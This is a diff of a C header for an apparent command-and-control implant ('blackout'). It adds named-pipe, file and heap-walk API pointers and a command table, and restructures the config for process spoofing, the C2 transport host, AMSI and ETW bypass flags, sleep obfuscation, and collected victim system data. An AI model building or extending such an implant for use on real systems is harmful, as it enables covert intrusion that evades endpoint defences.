@@ -15,7 +15,11 @@
 #include <BkApi.h>
 #include <Utils.h>
 #include <Package.h>
+#include <Command.h>
 #include <Transport.h>
+
+#define BLACKOUT_COMMAND_LENGTH 10
+#define BLACKOUT_MAGIC_VALUE ( UINT32 ) 'taln'
 
 //
 // blackout instances
@@ -34,6 +38,16 @@ typedef struct _INSTANCE {
     BUFFER Base;
 
     struct {
+        BOOL     (WINAPI *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
+        HANDLE   (WINAPI *CreateNamedPipeA)(LPCSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+        HANDLE   (WINAPI *CreateNamedPipeW)(LPCWSTR lpName, DWORD dwOpenMode, DWORD dwPipeMode, DWORD nMaxInstances, DWORD nOutBufferSize, DWORD nInBufferSize, DWORD nDefaultTimeOut, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+        BOOL     (WINAPI *ConnectNamedPipe)(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped);
+        HANDLE   (WINAPI *CreateMailslotA)(LPCSTR lpName, DWORD nMaxMessageSize, DWORD lReadTimeout, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+        HANDLE   (WINAPI *CreateMailslotW)(LPCWSTR lpName, DWORD nMaxMessageSize, DWORD lReadTimeout, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+        HANDLE   (WINAPI *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+        HANDLE   (WINAPI *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
+        BOOL     (WINAPI *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
+
         BOOL    (WINAPI *CreateTimerQueueTimer)(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
         HANDLE  (WINAPI *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
         BOOL    (WINAPI *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
@@ -75,6 +89,7 @@ typedef struct _INSTANCE {
         BOOL    (WINAPI *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
         BOOL    (WINAPI *GetProductInfo)(DWORD dwOSMajorVersion, DWORD dwOSMinorVersion, DWORD dwSpMajorVersion, DWORD dwSpMinorVersion, PDWORD pdwReturnedProductType);
         void    (WINAPI *GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
+        BOOL    (WINAPI *HeapWalk)(HANDLE hHeap, LPPROCESS_HEAP_ENTRY lpEntry);
 
         void     (NTAPI *RtlExitUserProcess)(NTSTATUS ExitStatus);
         void     (NTAPI *RtlExitUserThread)(NTSTATUS ExitStatus);
@@ -105,12 +120,14 @@ typedef struct _INSTANCE {
         NTSTATUS (NTAPI *NtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);
         NTSTATUS (NTAPI *NtClose)(HANDLE Handle);
         NTSTATUS (NTAPI *NtTerminateProcess)(HANDLE ProcessHandle, NTSTATUS ExitStatus);
+        NTSTATUS (NTAPI *NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
+        NTSTATUS (NTAPI *NtCreateNamedPipeFile)(PHANDLE FileHandle, ULONG DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, ULONG NamedPipeType, ULONG ReadMode, ULONG CompletionMode, ULONG MaximumInstances, ULONG InboundQuota, ULONG OutboundQuota, PLARGE_INTEGER DefaultTimeout);
 
         BOOL      (WINAPI *GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
         NTSTATUS  (NTAPI *SystemFunction032)(struct USTRING* Img, struct USTRING* Key);
 
-        PVOID SystemFunction040;
-        PVOID SystemFunction041;
+        NTSTATUS (NTAPI *SystemFunction040)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );
+        NTSTATUS (NTAPI *SystemFunction041)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );
 
         HINTERNET (*WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
         HINTERNET (*WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
@@ -140,58 +157,57 @@ typedef struct _INSTANCE {
     } Modules;
 
     struct {
-        struct {
-            PSTR  Spawnto;
-            DWORD Ppid;
-            BOOL  Blockdlls;
-            PWSTR Argue;            
-        } Fork;
+        PSTR  Spawnto;
+        DWORD Ppid;
+        BOOL  Blockdlls;
+        PWSTR Argue;            
+    } Fork;
 
-        struct {   
-            LPWSTR   UserAgent;
-            LPWSTR   Host;
-            DWORD    Port;
-            PPACKAGE Package;
-            BOOL     Secure;
-        } TransportWeb;
-        
-        struct {
-            DWORD  AgentId;
-            DWORD  ProcessArch;
-            BOOL   Elevated;
-            BOOL   Connected;
-            PWSTR  ProcessName;
-            PWSTR  ProcessFullPath;
-            PWSTR  ProcessCmdLine;
-            DWORD  ParentProcId;
-            DWORD  ProcessId;
-            DWORD  ThreadId;
-            PVOID  Heap;
-            BOOL   Ntapi;
-            DWORD  SleepObf;
-            DWORD  SleepTime;
-            DWORD  Jitter;
-            BOOL   AmsiBypass;
-            BOOL   EtwBypass;
-            UINT64 KillDate;
-            UINT32 WorkingHours;
-        } Session;
+    struct {   
+        LPWSTR   UserAgent;
+        LPWSTR   Host;
+        DWORD    Port;
+        PPACKAGE Package;
+        BOOL     Secure;
+    } Transport;
+    
+    struct {
+        DWORD  AgentId;
+        DWORD  ProcessArch;
+        BOOL   Elevated;
+        BOOL   Connected;
+        PWSTR  ProcessName;
+        PWSTR  ProcessFullPath;
+        PWSTR  ProcessCmdLine;
+        DWORD  ParentProcId;
+        DWORD  ProcessId;
+        DWORD  ThreadId;
+        PVOID  Heap;
+        BOOL   Ntapi;
+        DWORD  SleepObf;
+        DWORD  SleepTime;
+        DWORD  Jitter;
+        BOOL   AmsiBypass;
+        BOOL   EtwBypass;
+        UINT64 KillDate;
+        UINT32 WorkingHours;
+    } Session;
 
-        struct {
-            CHAR  UserName[MAX_PATH];
-            CHAR  DomainName[MAX_PATH];
-            CHAR  ComputerName[MAX_PATH];
-            CHAR  NetBios[MAX_PATH];
-            WORD  OsArch;
-            DWORD OsMajorV;
-            DWORD OsMinorv;
-            WORD  OsBuildNumber;
-            DWORD ProcessorType;
-            DWORD ProductType;
-            PSTR  IpAddress;
-        } CompData;
+    struct {
+        CHAR  UserName[MAX_PATH];
+        CHAR  DomainName[MAX_PATH];
+        CHAR  ComputerName[MAX_PATH];
+        CHAR  NetBios[MAX_PATH];
+        WORD  OsArch;
+        DWORD OsMajorV;
+        DWORD OsMinorv;
+        WORD  OsBuildNumber;
+        DWORD ProcessorType;
+        DWORD ProductType;
+        PSTR  IpAddress;
+    } System;
 
-    } Config;
+    BLACKOUT_COMMAND Commands[ BLACKOUT_COMMAND_LENGTH ];
 
 } INSTANCE, *PINSTANCE;
 
